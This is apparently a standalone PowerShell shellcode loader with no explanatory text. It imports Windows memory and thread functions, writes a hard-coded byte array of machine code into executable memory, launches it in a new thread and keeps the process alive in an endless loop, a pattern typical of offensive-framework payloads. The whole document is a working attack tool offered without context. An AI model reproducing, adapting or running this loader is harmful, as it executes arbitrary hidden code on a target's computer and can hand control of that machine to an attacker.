$Sf8 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Sf8 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0x23,0x96,0x60,0xa9,0xdb,0xd7,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x47,0x83,0xea,0xfc,0x31,0x7a,0x0f,0x03,0x7a,0x2c,0x74,0x95,0x55,0xda,0xfa,0x56,0xa6,0x1a,0x9b,0xdf,0x43,0x2b,0x9b,0x84,0x00,0x1b,0x2b,0xce,0x45,0x97,0xc0,0x82,0x7d,0x2c,0xa4,0x0a,0x71,0x85,0x03,0x6d,0xbc,0x16,0x3f,0x4d,0xdf,0x94,0x42,0x82,0x3f,0xa5,0x8c,0xd7,0x3e,0xe2,0xf1,0x1a,0x12,0xbb,0x7e,0x88,0x83,0xc8,0xcb,0x11,0x2f,0x82,0xda,0x11,0xcc,0x52,0xdc,0x30,0x43,0xe9,0x87,0x92,0x65,0x3e,0xbc,0x9a,0x7d,0x23,0xf9,0x55,0xf5,0x97,0x75,0x64,0xdf,0xe6,0x76,0xcb,0x1e,0xc7,0x84,0x15,0x66,0xef,0x76,0x60,0x9e,0x0c,0x0a,0x73,0x65,0x6f,0xd0,0xf6,0x7e,0xd7,0x93,0xa1,0x5a,0xe6,0x70,0x37,0x28,0xe4,0x3d,0x33,0x76,0xe8,0xc0,0x90,0x0c,0x14,0x48,0x17,0xc3,0x9d,0x0a,0x3c,0xc7,0xc6,0xc9,0x5d,0x5e,0xa2,0xbc,0x62,0x80,0x0d,0x60,0xc7,0xca,0xa3,0x75,0x7a,0x91,0xab,0xba,0xb7,0x2a,0x2b,0xd5,0xc0,0x59,0x19,0x7a,0x7b,0xf6,0x11,0xf3,0xa5,0x01,0x56,0x2e,0x11,0x9d,0xa9,0xd1,0x62,0xb7,0x6d,0x85,0x32,0xaf,0x44,0xa6,0xd8,0x2f,0x69,0x73,0x74,0x35,0xfd,0xbc,0x21,0x34,0xef,0x54,0x30,0x37,0x1e,0xf9,0xbd,0xd1,0x70,0x51,0xee,0x4d,0x30,0x01,0x4e,0x3e,0xd8,0x4b,0x41,0x61,0xf8,0x73,0x8b,0x0a,0x92,0x9b,0x62,0x62,0x0a,0x05,0x2f,0xf8,0xab,0xca,0xe5,0x84,0xeb,0x41,0x0a,0x78,0xa5,0xa1,0x67,0x6a,0x51,0x42,0x32,0xd0,0xf7,0x5d,0xe8,0x7f,0xf7,0xcb,0x17,0xd6,0xa0,0x63,0x1a,0x0f,0x86,0x2b,0xe5,0x7a,0x9d,0xe2,0x73,0xc5,0xc9,0x0a,0x94,0xc5,0x09,0x5d,0xfe,0xc5,0x61,0x39,0x5a,0x96,0x94,0x46,0x77,0x8a,0x05,0xd3,0x78,0xfb,0xfa,0x74,0x11,0x01,0x25,0xb2,0xbe,0xfa,0x00,0x42,0x82,0x2c,0x6c,0x30,0xea,0xec;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$tZS9=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($tZS9.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$tZS9,0,0,0);for (;;){Start-sleep 60};
